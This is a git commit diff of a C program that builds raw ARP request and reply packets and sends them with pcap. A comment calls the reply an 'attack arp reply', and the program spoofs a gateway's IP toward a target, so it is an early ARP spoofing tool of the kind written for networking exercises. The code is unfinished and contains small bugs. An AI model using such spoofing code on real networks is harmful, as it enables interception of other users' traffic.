035dd6d569d75e8857a2c18209a077ec9b6b5864
gullabjamun <supermariocake@gmail.com>
2017-07-28 13:15:03 +0900

    make arp request, reply packet format and put argv arguments to packet

--- main.c
+++ main.c
@@ -8,7 +8,21 @@
 
      int main(int argc, char *argv[])
      {
-	u_char send_packet_arprequest[42]={0,};
+	u_char send_packet_arprequest[42]={0xFF, 0xFF, 0xFF, 0xFF, 0xFF ,0xFF, 0x94, 0xE9,
+					 0x79, 0x95 ,0x00, 0xFD, 0x08, 0x06, 0x00, 0x01,
+					 0x08, 0x00, 0x06, 0x04 , 0x00 , 0x01 , 0x94 , 0xE9,
+					 0x79 , 0x95 , 0x00 , 0xFD , 0xC0 , 0xA8 , 0x2B , 0x45,
+					 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0xC0 , 0xA8,
+					 0x2B , 0x01};
+
+					 
+	u_char send_packet_arpreply[42]={0xFF, 0xFF, 0xFF, 0xFF, 0xFF ,0xFF, 0x94, 0xE9,
+					 0x79, 0x95 ,0x00, 0xFD, 0x08, 0x06, 0x00, 0x01,
+					 0x08, 0x00, 0x06, 0x04 , 0x00 , 0x02 , 0x94 , 0xE9,
+					 0x79 , 0x95 , 0x00 , 0xFD , 0xC0 , 0xA8 , 0x2B , 0x45,
+					 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0xC0 , 0xA8,
+					 0x2B , 0x01};
+
 	u_char receive_packet[42];
 
 
@@ -27,8 +41,10 @@
 	u_char ipoff;
 	char ip_dst_str[16];
 	char ip_src_str[16];
-	struct arphdr arprequest_arp;
-	struct arphdr arpreply_arp;
+
+	struct arphdr *arprequest_arp;
+	struct arphdr *arpreply_arp;
+
 	struct arphdr *arp_to_know_targetmac;
 	struct sniff_ethernet *ethernet;
 	struct sniff_ethernet arprequest_eth;
@@ -43,16 +59,12 @@
 	u_char *sender_ip=argv[2];
 	u_char *target_ip=argv[3];
 
+	arprequest_arp=(struct arphdr*)(send_packet_arprequest+14);
+	arpreply_arp=(struct arphdr*)(send_packet_arpreply+14);
+
 	/* arp request to know target mac address*/
 ////	arprequest_eth.ether_dhost={0xff,0xff,0xff,0xff,0xff,0xff};
 ////	arprequest_eth.ether_shost={0x00,0x0c,0x29,0xe8,0xc7,0x22};
-	arprequest_eth.ether_type=htons(0x0806);
-
-	arprequest_arp.htype=htons(0x0001);
-	arprequest_arp.ptype=htons(0x0800);
-	arprequest_arp.hlen=htons(0x06);
-	arprequest_arp.plen=htons(0x04);
-	arprequest_arp.oper=htons(0x0001);
 ////	arprequest_arp.sha={0x00,0x0c,0x29,0xe8,0xc7,0x22};
 //	arprequest_arp.spa=htons(0x0001);			//senderip-my ip
 ////	arprequest_arp.tha={0,};
@@ -61,18 +73,12 @@
 	/* attack arp reply */
 ////	arpreply_eth.ether_dhost={target mac};
 ////	arpreply_eth.ether_shost={0x00,0x0c,0x29,0xe8,0xc7,0x22}; 
-	arpreply_eth.ether_type=htons(0x0806);
-	inet_pton(AF_INET,sender_ip,(arpreply_arp).spa);
-	inet_pton(AF_INET,target_ip,(arpreply_arp).tpa);
-	arpreply_arp.htype=htons(0x0001);
-	arpreply_arp.ptype=htons(0x0800);
-	arpreply_arp.hlen=htons(0x06);
-	arpreply_arp.plen=htons(0x04);
-	arpreply_arp.oper=htons(0x0002);
+	inet_pton(AF_INET,sender_ip,(*arpreply_arp).spa); //sender ip - gateway
+	inet_pton(AF_INET,target_ip,(*arpreply_arp).tpa); //targetip
 ////	arpreply_arp.sha={0x00,0x0c,0x29,0xe8,0xc7,0x22};
-//	arpreply_arp.spa=htons(0x0001);				//sender ip - gateway
+				
 ////	arpreply_arp.tha={target mac};
-//	arpreply_arp.tpa=htons(0x0001);				//targetip
+			
 	
 	u_char *target_mac;
 
@@ -115,8 +121,8 @@
 		/* Print its length */
 
 		ethernet=(struct sniff_ethernet*)packet;
-	
-	if(ntohs((*ethernet).ether_type)==ETHERTYPE_ARP)
+
+		if(ntohs((*ethernet).ether_type)==ETHERTYPE_ARP)
 	{
 		arp_to_know_targetmac==(struct arphdr*)(packet+14);
 		if(ntohs((*arp_to_know_targetmac).oper)==0x0002)
@@ -129,12 +135,13 @@
 	}	
 
 
+
 	      	printf("%s\n",sender_ip);
 		printf("%s\n",target_ip);
-	      	printf("%2x\n",*((arpreply_arp).spa));
-		printf("%2x\n",*((arpreply_arp).tpa));
+//	      	printf("%2x\n",*((arpreply_arp).spa));
+//		printf("%2x\n",*((arpreply_arp).tpa));
 
-		if(pcap_sendpacket(handle,send_packet_arprequest,42)!=0)
+		if(pcap_sendpacket(handle,send_packet_arpreply,42)!=0)
 		{
 			printf("error\n");
 		}
